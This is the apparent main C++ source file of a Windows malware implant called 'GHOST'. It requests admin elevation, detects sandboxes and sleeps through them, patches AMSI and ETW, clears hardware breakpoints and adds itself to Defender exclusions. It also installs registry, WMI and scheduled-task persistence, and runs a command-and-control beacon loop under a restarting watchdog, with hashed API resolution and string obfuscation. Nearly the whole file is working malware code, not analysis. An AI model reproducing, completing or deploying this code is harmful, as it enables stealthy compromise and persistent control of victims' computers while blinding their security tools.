#include <windows.h>
#include <stdio.h>
#include <algorithm>
#include <shellapi.h>
#include "syscalls.hpp"
#include "evasion.hpp"
#include "c2.hpp"
#include "utils.hpp"
#include "persistence.hpp"
#include "injection.hpp"
#include "obfuscate.hpp"

// ─── Debug logging ────────────────────────────────────────────────────────────
// Opens, writes, closes each call — survives crashes, works in elevated child.
// OutputDebugStringA fallback lets DebugView catch it if the file fails.
#ifdef DEBUG
static void DbgLog(const char* msg) {
    OutputDebugStringA(msg);
    HANDLE hf = CreateFileA("C:\\Users\\Public\\ghost_debug.log",
        FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) return;
    DWORD w; WriteFile(hf, msg, (DWORD)strlen(msg), &w, NULL);
    CloseHandle(hf);
}
#define DBG(fmt, ...) do { \
    char _b[512]; \
    sprintf_s(_b, sizeof(_b), "[pid=%lu] " fmt "\n", GetCurrentProcessId(), ##__VA_ARGS__); \
    DbgLog(_b); \
} while(0)
#else
#define DBG(fmt, ...) do {} while(0)
#endif

static void NtSleep(DWORD ms) {
    typedef NTSTATUS (NTAPI *NtDelayExecution_t)(BOOLEAN, PLARGE_INTEGER);
    static NtDelayExecution_t pfn = nullptr;
    if (!pfn) {
        HMODULE h = GetModuleHandleA(XS("ntdll.dll"));
        if (h) pfn = reinterpret_cast<NtDelayExecution_t>(HashProc(h, FNV("NtDelayExecution")));
    }
    if (pfn) {
        LARGE_INTEGER li;
        li.QuadPart = -static_cast<LONGLONG>(ms) * 10000LL;
        pfn(FALSE, &li);
    } else Sleep(ms);
}

static void DecoyLoop() {
    volatile unsigned long long fib = 1, a = 0, b = 1;
    for (int i = 0; i < 5000000; i++) { fib = a + b; a = b; b = fib; }
}

// ─── Admin elevation ──────────────────────────────────────────────────────────
static BOOL EnsureElevated() {
    DBG("EnsureElevated: IsElevated=%d", (int)IsElevated());
    if (IsElevated()) return TRUE;
    wchar_t exePath[MAX_PATH] = {};
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    SHELLEXECUTEINFOW sei = {};
    sei.cbSize      = sizeof(sei);
    sei.fMask       = SEE_MASK_NOCLOSEPROCESS;
    sei.lpVerb      = L"runas";
    sei.lpFile      = exePath;
    sei.lpParameters = L"--elevated";
    sei.nShow       = SW_SHOW; // ponytail: SW_HIDE for release
    BOOL ok = ShellExecuteExW(&sei);
    DBG("EnsureElevated: ShellExecuteExW=%d err=%lu", ok, GetLastError());
    if (ok) { Sleep(1000); return FALSE; }
    MessageBoxW(NULL, L"GHOST requires administrator privileges.", L"Elevation Required", MB_ICONERROR | MB_OK);
    return FALSE;
}

DWORD WINAPI ImplantThread(LPVOID) {
    DBG("ImplantThread started");

    if (SandboxCheck()) {
        DBG("Sandbox detected – deep sleep");
        DeepSleep();
        return 1;
    }

    DBG("DecoyLoop start");
    DecoyLoop();
    DBG("DecoyLoop done");

    DBG("InitializeSyscalls start");
    while (!InitializeSyscalls()) {
        DBG("InitializeSyscalls failed – retry in 5s");
        NtSleep(5000);
    }
    DBG("InitializeSyscalls done");

    DBG("PatchAMSI start");
    PatchAMSI();
    DBG("PatchETW start");
    PatchETW();
    DBG("ClearHardwareBreakpoints start");
    ClearHardwareBreakpoints();
    DBG("Evasion done");

    wchar_t exePath[MAX_PATH] = {};
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    if (IsElevated()) {
        DBG("AddDefenderExclusion start");
        AddDefenderExclusion(exePath);
        DBG("AddDefenderExclusion done");
    }

    DBG("Persistence start");
    InstallRegistryPersistence(exePath);
    if (!IsWmiPersistenceInstalled()) {
        InstallWmiPersistence(exePath);
        InstallWmiScriptPersistence(exePath);
    }
    if (!IsScheduledTaskInstalled()) {
        InstallScheduledTaskPersistence(exePath);
    }
    DBG("Persistence done");

    DBG("BeaconLoop start");
    BeaconLoop();
    DBG("BeaconLoop returned");
    return 0;
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
    DBG("WinMain entered");

    bool hasElevatedFlag = lpCmdLine && strstr(lpCmdLine, "--elevated") != nullptr;
    DBG("hasElevatedFlag=%d", (int)hasElevatedFlag);

    if (!hasElevatedFlag) {
        DBG("calling EnsureElevated");
        if (!EnsureElevated()) {
            DBG("not elevated – parent exiting");
            return 0;
        }
    }

    DBG("admin=%d", (int)IsElevated());
    SetErrorMode(SEM_NOGPFAULTERRORBOX | SEM_FAILCRITICALERRORS);

    DBG("HASHPROC resolution start");
    auto hKernel32 = GetModuleHandleA(XS("kernel32.dll"));
    DBG("kernel32=%p", hKernel32);
    if (!hKernel32) { DBG("kernel32 null – exit"); return 0; }

    auto _CreateThread       = HASHPROC(hKernel32, CreateThread);
    auto _WaitForSingleObject = HASHPROC(hKernel32, WaitForSingleObject);
    auto _CloseHandle        = HASHPROC(hKernel32, CloseHandle);
    auto _GetExitCodeThread  = HASHPROC(hKernel32, GetExitCodeThread);
    DBG("procs: CT=%p WFSO=%p CH=%p GECT=%p",
        _CreateThread, _WaitForSingleObject, _CloseHandle, _GetExitCodeThread);

    if (!_CreateThread || !_WaitForSingleObject || !_CloseHandle || !_GetExitCodeThread) {
        DBG("HASHPROC failed – exit");
        return 0;
    }

    DBG("entering watchdog loop");
    DWORD restartCount = 0;
    while (true) {
        if (restartCount > 0) {
            DWORD backoffMs = std::min(5000UL * (1UL << (restartCount - 1)), 60000UL);
            DBG("watchdog backoff %lums (restart #%lu)", backoffMs, restartCount);
            Sleep(backoffMs);
        }
        DBG("spawning ImplantThread (restart #%lu)", restartCount);
        HANDLE hThread = _CreateThread(NULL, 0, ImplantThread, NULL, 0, NULL);
        if (!hThread) { DBG("CreateThread failed err=%lu", GetLastError()); Sleep(5000); ++restartCount; continue; }
        _WaitForSingleObject(hThread, INFINITE);
        DWORD exitCode = 0;
        _GetExitCodeThread(hThread, &exitCode);
        _CloseHandle(hThread);
        DBG("ImplantThread exited code=%lu", exitCode);
        if (exitCode == 0) { DBG("clean exit"); return 0; }
        ++restartCount;
    }
}
